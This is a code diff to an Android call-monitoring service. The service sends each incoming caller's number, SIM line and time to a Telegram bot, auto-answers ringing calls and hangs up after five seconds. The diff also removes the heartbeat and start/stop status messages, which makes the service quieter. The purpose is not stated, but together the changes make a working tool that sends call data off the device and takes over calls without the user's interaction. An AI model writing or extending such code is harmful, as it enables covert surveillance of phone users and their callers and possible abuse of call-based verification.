@@ -39,8 +39,7 @@ public class CallMonitorService extends Service {
     private PhoneStateListener phoneStateListener;
     private Object telephonyCallback; // For API 31+
     private TelegramSender telegramSender;
-    private Handler heartbeatHandler;
-    private Runnable heartbeatRunnable;
+    // Removed heartbeat fields
     private long callStartTime = 0;
     private boolean isRinging = false;
     private String lastIncomingNumber = "";
@@ -53,7 +52,7 @@ public class CallMonitorService extends Service {
         createNotificationChannel();
         telegramSender = new TelegramSender(this);
         
-        // Log Service Start
+        // Log Service Start (Local log only)
         CustomExceptionHandler.log(this, "Service onCreate. SDK: " + Build.VERSION.SDK_INT);
 
         // Acquire WakeLock
@@ -87,7 +86,6 @@ public class CallMonitorService extends Service {
             }
         } catch (Throwable e) {
             Log.e("CallMonitorService", "Error starting foreground service", e);
-            // Fallback: try standard start if specific type fails
             try {
                 startForeground(NOTIFICATION_ID, notification);
             } catch (Throwable t) {
@@ -99,14 +97,10 @@ public class CallMonitorService extends Service {
         telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
         registerPhoneListener();
         
-        // Register BroadcastReceiver for Call State (Reliable number retrieval)
+        // Register BroadcastReceiver
         registerCallReceiver();
 
-        // Start Heartbeat
-        startHeartbeat();
-        
-        // Notify start
-        telegramSender.sendMessage("✅ Call Monitor Service Started\n🔋 Battery: " + getBatteryLevel() + "%\n📶 Network: " + getNetworkType());
+        // Removed Heartbeat and Start Notification per user request
     }
 
     @Override
@@ -129,7 +123,8 @@ public class CallMonitorService extends Service {
                         state = TelephonyManager.CALL_STATE_OFFHOOK;
                     }
                     
-                    handleCallState(state, number);
+                    // BroadcastReceiver doesn't give SIM info easily, passing -1
+                    handleCallState(state, number, -1);
                 }
             }
         };
@@ -138,10 +133,40 @@ public class CallMonitorService extends Service {
     }
 
     private void registerPhoneListener() {
-        if (Build.VERSION.SDK_INT >= 31) {
-            registerTelephonyCallback();
-        } else {
-            registerLegacyPhoneListener();
+        // Multi-SIM Support
+        android.telephony.SubscriptionManager subscriptionManager = getSystemService(android.telephony.SubscriptionManager.class);
+        if (androidx.core.app.ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            java.util.List<android.telephony.SubscriptionInfo> subList = subscriptionManager.getActiveSubscriptionInfoList();
+            if (subList != null && !subList.isEmpty()) {
+                for (android.telephony.SubscriptionInfo subInfo : subList) {
+                    int subId = subInfo.getSubscriptionId();
+                    int slotIndex = subInfo.getSimSlotIndex(); // 0 or 1
+                    registerListenerForSub(subId, slotIndex + 1);
+                }
+            } else {
+                // Fallback for single SIM or if list is empty
+                if (Build.VERSION.SDK_INT >= 31) {
+                    registerTelephonyCallback();
+                } else {
+                    registerLegacyPhoneListener();
+                }
+            }
+        }
+    }
+
+    private void registerListenerForSub(int subId, int simSlot) {
+        TelephonyManager subTm = telephonyManager.createForSubscriptionId(subId);
+        
+        try {
+            PhoneStateListener listener = new PhoneStateListener() {
+                @Override
+                public void onCallStateChanged(int state, String phoneNumber) {
+                    handleCallState(state, phoneNumber, simSlot);
+                }
+            };
+            subTm.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);
+        } catch (Exception e) {
+            Log.e("CallMonitorService", "Error registering listener for SIM " + simSlot, e);
         }
     }
 
@@ -150,7 +175,7 @@ public class CallMonitorService extends Service {
             phoneStateListener = new PhoneStateListener() {
                 @Override
                 public void onCallStateChanged(int state, String phoneNumber) {
-                    handleCallState(state, phoneNumber);
+                    handleCallState(state, phoneNumber, -1);
                 }
             };
             telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE);
@@ -177,31 +202,17 @@ public class CallMonitorService extends Service {
     private class CallStateCallback extends TelephonyCallback implements TelephonyCallback.CallStateListener {
         @Override
         public void onCallStateChanged(int state) {
-            // Note: onCallStateChanged in API 31+ does not provide phone number directly here safely in all cases without permission check
-            // However, we can try to get it if we have permission, or use a workaround.
-            // Actually, the callback doesn't provide the number. We have to query it.
-            // Wait, this is a limitation. Legacy listener provided it.
-            // Let's use a workaround: check call state, if ringing, try to get call log or just say "Incoming Call"
-            // But wait, the user wants the number.
-            // Let's stick to legacy listener for now if it works, or use BroadcastReceiver for PHONE_STATE which contains incoming number.
-            // But we can still use legacy listener on newer Android versions, it's just deprecated.
-            // Let's use the legacy listener approach inside the callback if possible, or just call handleCallState with null number and fetch it differently.
-            
-            // Actually, let's keep it simple: use the legacy listener for now as it still works on Android 14 target 34,
-            // just with a warning. But if it crashes, we need this.
-            // But wait, CallStateListener in TelephonyCallback DOES NOT provide phone number.
-            // We need to use BroadcastReceiver for that.
-            handleCallState(state, null);
+            handleCallState(state, null, -1);
         }
     }
     
-    private void handleCallState(int state, String incomingNumber) {
+    private void handleCallState(int state, String incomingNumber, int simSlot) {
         if (incomingNumber == null) incomingNumber = "Unknown";
         if (lastIncomingNumber.equals(incomingNumber) && state == TelephonyManager.CALL_STATE_RINGING) {
             return; // Duplicate
         }
         
-        CustomExceptionHandler.log(this, "Call State: " + state + ", Number: " + (incomingNumber != null ? incomingNumber : "NULL"));
+        CustomExceptionHandler.log(this, "Call State: " + state + ", Number: " + incomingNumber + ", SIM: " + simSlot);
 
         switch (state) {
             case TelephonyManager.CALL_STATE_RINGING:
@@ -209,45 +220,71 @@ public class CallMonitorService extends Service {
                 callStartTime = System.currentTimeMillis();
                 lastIncomingNumber = incomingNumber;
                 
+                String simInfo = (simSlot != -1) ? "SIM " + simSlot : "Unknown SIM";
+                
                 String msg = "📞 Incoming Call Detected!\n" +
-                        "🔢 Number: " + (incomingNumber != null ? incomingNumber : "Unknown") + "\n" +
+                        "🔢 Number: " + incomingNumber + "\n" +
+                        "📱 Line: " + simInfo + "\n" +
                         "⏰ Time: " + new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
                 
                 telegramSender.sendMessage(msg);
+                
+                // Auto Answer Logic
+                attemptAutoAnswer();
                 break;
+                
             case TelephonyManager.CALL_STATE_OFFHOOK:
                 if (isRinging) {
-                    telegramSender.sendMessage("✅ Call Answered");
-                } else {
-                    // Outgoing call
-                    telegramSender.sendMessage("Outgoing Call Started");
+                    // Call Answered
+                    // Start 5 second timer to hang up
+                    new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
+                        @Override
+                        public void run() {
+                            attemptHangUp();
+                        }
+                    }, 5000);
                 }
                 isRinging = false;
                 break;
+                
             case TelephonyManager.CALL_STATE_IDLE:
-                if (isRinging) {
-                     telegramSender.sendMessage("❌ Call Missed/Rejected");
-                } else {
-                     telegramSender.sendMessage("Call Ended");
-                }
                 isRinging = false;
                 break;
         }
     }
+    
+    private void attemptAutoAnswer() {
+        if (Build.VERSION.SDK_INT >= 26) {
+             android.telecom.TelecomManager tm = (android.telecom.TelecomManager) getSystemService(Context.TELECOM_SERVICE);
+             if (tm != null) {
+                 if (androidx.core.app.ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ANSWER_PHONE_CALLS) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                     try {
+                         tm.acceptRingingCall();
+                         CustomExceptionHandler.log(this, "Auto-answered call via TelecomManager");
+                     } catch (Exception e) {
+                         Log.e("CallMonitorService", "Failed to answer call", e);
+                         CustomExceptionHandler.logError(this, e);
+                     }
+                 }
+             }
+        }
+    }
 
-    private void startHeartbeat() {
-        heartbeatHandler = new Handler(Looper.getMainLooper());
-        heartbeatRunnable = new Runnable() {
-            @Override
-            public void run() {
-                String heartbeatMsg = "💓 Heartbeat\nStatus: Running\n🔋 Battery: " + getBatteryLevel() + "%\n📶 Network: " + getNetworkType();
-                telegramSender.sendMessage(heartbeatMsg);
-                // Schedule next heartbeat in 15 minutes
-                heartbeatHandler.postDelayed(this, 15 * 60 * 1000);
-            }
-        };
-        // Start first heartbeat after 15 mins (or immediately if you prefer, but let's do delayed)
-        heartbeatHandler.postDelayed(heartbeatRunnable, 15 * 60 * 1000);
+    private void attemptHangUp() {
+        if (Build.VERSION.SDK_INT >= 28) {
+             android.telecom.TelecomManager tm = (android.telecom.TelecomManager) getSystemService(Context.TELECOM_SERVICE);
+             if (tm != null) {
+                 if (androidx.core.app.ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ANSWER_PHONE_CALLS) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                     try {
+                         tm.endCall();
+                         CustomExceptionHandler.log(this, "Auto-ended call via TelecomManager");
+                     } catch (Exception e) {
+                         Log.e("CallMonitorService", "Failed to end call", e);
+                         CustomExceptionHandler.logError(this, e);
+                     }
+                 }
+             }
+        }
     }
 
     private String getBatteryLevel() {
@@ -317,13 +354,10 @@ public class CallMonitorService extends Service {
                 telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE);
             }
         }
-        if (heartbeatHandler != null && heartbeatRunnable != null) {
-            heartbeatHandler.removeCallbacks(heartbeatRunnable);
-        }
         if (wakeLock != null && wakeLock.isHeld()) {
             wakeLock.release();
         }
-        telegramSender.sendMessage("🛑 Service Stopped");
+        // Removed stop notification
     }
 
     @Nullable
